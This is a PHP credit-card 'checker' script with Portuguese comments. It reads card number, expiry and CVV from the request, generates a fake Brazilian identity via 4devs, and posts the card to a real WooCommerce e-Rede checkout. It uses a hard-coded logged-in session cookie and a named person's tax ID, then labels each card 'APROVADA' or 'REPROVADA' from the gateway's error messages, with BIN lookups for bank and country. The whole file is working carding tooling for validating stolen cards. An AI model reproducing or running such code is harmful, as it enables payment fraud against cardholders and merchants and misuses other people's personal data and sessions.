<?php
error_reporting(0);
set_time_limit(0);

DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

extract($_GET);

function getStr($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

$separador = explode("|", $lista);
$cc = trim($separador[0]);


$cctwo = substr("$cc", 0, 6);


function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","Â»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);

/*if($ano == 2019){  //QUANDO O ANO DO GATE NÃƒO TIVER 20, USE ESSA FUNÃ‡ÃƒO '.$ano1.'
$ano1 = "19";
}else if($ano == 2020){
$ano1 = "20";
}else if($ano == 2021){
$ano1 = "21";
}else if($ano == 2022){
$ano1 = "22";
}else if($ano == 2023){
$ano1 = "23";
}else if($ano == 2024){
$ano1 = "24";
}else if($ano == 2025){
$ano1 = "25";
}else if($ano == 2026){
$ano1 = "26";
}else if($ano == 2027){
$ano1 = "27";
}else if($ano == 2028){
$ano1 = "28";
}else if($ano == 2029){
$ano1 = "29";
}else if($ano == 2030){
$ano1 = "30";
}else if($ano == 2031){
$ano1 = "31";
}else{
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> Validade Invalida</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}*/

/*if($cc[0]==4){ //QUANDO VOCÃŠ NÃƒO QUISER QUE TESTE UMA TAL GERADA NO GATE
'<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==5){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==3){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==2){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==1){
     '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}*/

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

//=========================================//4 DEVS PHP//=========================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
$dados = curl_exec($ch);

$dados1 = json_decode($dados, true);

$name = $dados1["nome"];
$cpf = $dados1["cpf"];
$cep = $dados1["cep"];
$endereco = $dados1["endereco"];
$celular = $dados1["celular"];
$email = mt_rand();

//=========================================//PEGAR AS REQUEST DO TOKEN DO SITE//=========================================//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.vpereck.com.br/finalizar-compra/pagar/1781/?pay_for_order=true&key=wc_order_dCCSaFpJRgBQQ');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.vpereck.com.br',
'Origin: https://www.vpereck.com.br',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'Referer: https://www.vpereck.com.br/finalizar-compra/pagar/1781/?pay_for_order=true&key=wc_order_dCCSaFpJRgBQQ',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Cookie: poptin_old_user=true; poptin_user_id=0.xd9th2z96a; _ga=GA1.3.1571568383.1592260426; _gid=GA1.3.1711487597.1592260426; __utmc=263416523; _hjid=36c44220-62d2-4778-9dca-f123c60eb555; _fbp=fb.2.1592260427619.558615828; _hjIncludedInSample=1; poptin_session=true; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; __utma=263416523.1571568383.1592260426.1592276970.1592289860.3; __utmz=263416523.1592289860.3.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); tk_ai=Tz4N9ZO%2BMDLafU1Zx1l628G3; _hjAbsoluteSessionInProgress=1; wordpress_logged_in_3e2005f51337a33c3a0de46499457b69=chuck201%7C1592462801%7C4NytGsjTKblHov85tAtO95qn2eVSYhsYgz5n16xruLt%7C992f97b9abc17e704ec8636d414a9195d992bd935e18aeadede99c316f689806; wp_woocommerce_session_3e2005f51337a33c3a0de46499457b69=72%7C%7C1592462759%7C%7C1592459159%7C%7Cbdb5ef625239781e9f359304680f6585; tk_lr=%22%22; woocommerce_recently_viewed=1478%7C1308; tk_qs=; __utmt_UA-143796805-1=1; __utmb=263416523.17.10.1592289860',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=loja5_woo_novo_erede&erede_api%5Bbandeira%5D=elo&erede_api%5Btitular%5D=ELDIMILSON+JORGE+ANDRADE&erede_api%5Bfiscal%5D=08407136735&erede_api%5Bnumero%5D='.$cc.'&erede_api%5Bvalidade%5D='.$mes.'%2F'.$ano.'&erede_api%5Bcvv%5D=000&erede_api%5Bparcela%5D=MXwxfDI1Mi45OXxaV3h2fE1qVXlMams1fDNhMzRjMTFhYmNjYjc5MmFkYmU1ZTg1NTkwNzU4YTBl&woocommerce_pay=1&woocommerce-pay-nonce=fefb4a8860&_wp_http_referer=%2Ffinalizar-compra%2Fpagar%2F1781%2F%3Fpay_for_order%3Dtrue%26key%3Dwc_order_dCCSaFpJRgBQQ');
$retorn = curl_exec($ch);

$bin = substr($cc, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
$encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
$pais = $pieces[4];
$paiscode = $pieces[5];
$banco = $pieces[2];
$level = $pieces[3];
$bandeira = $pieces[1];
} else {
$pais = $pieces[5];
$paiscode = $pieces[6];
$level = $pieces[4];
$banco = $pieces[2];
$bandeira = $pieces[1];
}

if (strpos($retorn, 'Unauthorized. Please try again.') !== false) {
echo
"APROVADA $lista|$  Retorno: Please try again (GERADA MASTER LIVE) #fredoapp";

}elseif (strpos($retorn, 'Unauthorized. Invalid security code.') !== false) {
echo
"APROVADA $lista $bandeira $banco $level $pais $paiscode  Retorno: Invalid security code.  #fredo.app";


}elseif (strpos($retorn, 'Success') !== false) {
	
echo "APROVADA $lista|$bin  Pagamento Autorizado. #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Restricted card.') !== false) {
echo
"REPROVADA $lista $bandeira $banco $level $pais $paiscode  Retorno: Cartão Restrito.  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Nonexistent card.') !== false) {
echo "REPROVADA $lista $bandeira $banco $level $pais $paiscode  Retorno: Cartão não existente.  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Transaction type not allowed for this card.') !== false) {

echo "REPROVADA $lista $bandeira $banco $level $pais $paiscode  Transação não permitida.  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Value not allowed for this type of card.') !== false) {
	
echo
"APROVADA $lista|$bin  Retorno: Cartão com saldo baixo, porém live  #fredo.app";


}elseif (strpos($retorn, 'Unauthorized. Expiry date expired.') !== false) {
	
echo "REPROVADA $lista $bandeira $banco $level $pais $paiscode  Retorno: Cartão com a validade vencida ou expirada  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Card locked.') !== false) {

echo "REPROVADA $lista $bandeira $banco $level $pais $paiscode  Retorno: Cartão bloqueado, um dia útil #fredo.app";
 }
else{
echo "REPROVADA $lista $bandeira $banco $levrl $pais $paiscode  Error.";

}

?>